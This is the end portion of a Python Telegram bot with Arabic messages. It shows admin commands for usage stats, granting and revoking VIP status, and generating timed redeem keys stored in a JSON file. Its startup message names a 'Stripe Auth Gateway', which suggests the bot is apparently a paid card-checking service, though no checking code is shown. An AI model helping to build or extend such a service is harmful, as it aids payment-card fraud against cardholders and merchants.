    vip_users = sum(1 for user in json_data.values() if user.get('plan') == '𝗩𝗜𝗣')
    free_users = total_users - vip_users
    
    stats_msg = f'''<b>📊 إحصائيات البوت

👥 إجمالي المستخدمين: {total_users}
⭐ مستخدمين VIP: {vip_users}
🆓 مستخدمين مجانيين: {free_users}

🤖 البوت يعمل بنظام Premium</b>'''
    
    bot.reply_to(message, stats_msg, parse_mode="HTML")

@bot.message_handler(commands=["adduser"])
def add_user_handler(message):
    """إضافة مستخدم VIP - خاص بالادمن"""
    if message.from_user.id != admin:
        bot.reply_to(message, '<b>غير مصرح لك بهذا الأمر ❌</b>', parse_mode="HTML")
        return
    
    try:
        parts = message.text.split()
        if len(parts) < 3:
            bot.reply_to(message, '<b>استخدم: /adduser [ID] [عدد الساعات]</b>', parse_mode="HTML")
            return
            
        user_id = int(parts[1])
        hours = float(parts[2])
        
        current_time = datetime.now()
        expiry_time = current_time + timedelta(hours=hours)
        expiry_str = expiry_time.strftime("%Y-%m-%d %H:%M")
        
        with open('data.json', 'r') as file:
            json_data = json.load(file)
        
        json_data[str(user_id)] = {
            "plan": "𝗩𝗜𝗣",
            "timer": expiry_str
        }
        
        with open('data.json', 'w') as file:
            json.dump(json_data, file, indent=2)
        
        bot.reply_to(message, f'<b>✅ تم إضافة المستخدم {user_id} كـ VIP لمدة {hours} ساعة</b>', parse_mode="HTML")
        
    except Exception as e:
        bot.reply_to(message, f'<b>خطأ: {e}</b>', parse_mode="HTML")

@bot.message_handler(commands=["removeuser"])
def remove_user_handler(message):
    """إزالة مستخدم من VIP - خاص بالادمن"""
    if message.from_user.id != admin:
        bot.reply_to(message, '<b>غير مصرح لك بهذا الأمر ❌</b>', parse_mode="HTML")
        return
    
    try:
        user_id = message.text.split()[1]
        
        with open('data.json', 'r') as file:
            json_data = json.load(file)
        
        if user_id in json_data:
            json_data[user_id]['plan'] = '𝗙𝗥𝗘𝗘'
            json_data[user_id]['timer'] = 'none'
            
            with open('data.json', 'w') as file:
                json.dump(json_data, file, indent=2)
            
            bot.reply_to(message, f'<b>✅ تم إزالة المستخدم {user_id} من VIP</b>', parse_mode="HTML")
        else:
            bot.reply_to(message, '<b>❌ المستخدم غير موجود</b>', parse_mode="HTML")
            
    except Exception as e:
        bot.reply_to(message, f'<b>خطأ: {e}</b>', parse_mode="HTML")

@bot.message_handler(commands=["code"])
def code_handler(message):
    def my_function():
        id = message.from_user.id
        if not id == admin:
            bot.reply_to(message, '<b>غير مصرح لك بهذا الأمر ❌</b>', parse_mode="HTML")
            return
        try:
            h = float(message.text.split(' ')[1])
            with open('data.json', 'r') as json_file:
                existing_data = json.load(json_file)
            characters = string.ascii_uppercase + string.digits
            pas = 'VIP-'+''.join(random.choices(characters, k=4))+'-'+''.join(random.choices(characters, k=4))+'-'+''.join(random.choices(characters, k=4))
            current_time = datetime.now()
            ig = current_time + timedelta(hours=h)
            plan = '𝗩𝗜𝗣'
            parts = str(ig).split(':')
            ig = ':'.join(parts[:2])
            with open('data.json', 'r') as json_file:
                existing_data = json.load(json_file)
            new_data = {
                pas: {
                    "plan": plan,
                    "time": ig,
                }
            }
            existing_data.update(new_data)
            with open('data.json', 'w') as json_file:
                json.dump(existing_data, json_file, ensure_ascii=False, indent=4)
            msg = f'''<b>𝗡𝗘𝗪 𝗞𝗘𝗬 𝗖𝗥𝗘𝗔𝗧𝗘𝗗 ✨

𝙋𝙇𝘼𝙉 ➜ {plan}
𝙀𝙓𝙋𝙄𝙍𝙀𝙎 ➜ {ig}
𝙆𝙀𝙔 ➜ <code>{pas}</code>

𝙐𝙎𝙀: /redeem {pas}</b>'''
            bot.reply_to(message, msg, parse_mode="HTML")
        except Exception as e:
            print('ERROR : ', e)
            bot.reply_to(message, f"<b>خطأ: {e}</b>", parse_mode="HTML")

    my_thread = threading.Thread(target=my_function)
    my_thread.start()

print("🤖 البوت يعمل بنظام Premium و Stripe Auth Gateway...")
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print("حدث خطأ: {}".format(e))
        time.sleep(5)
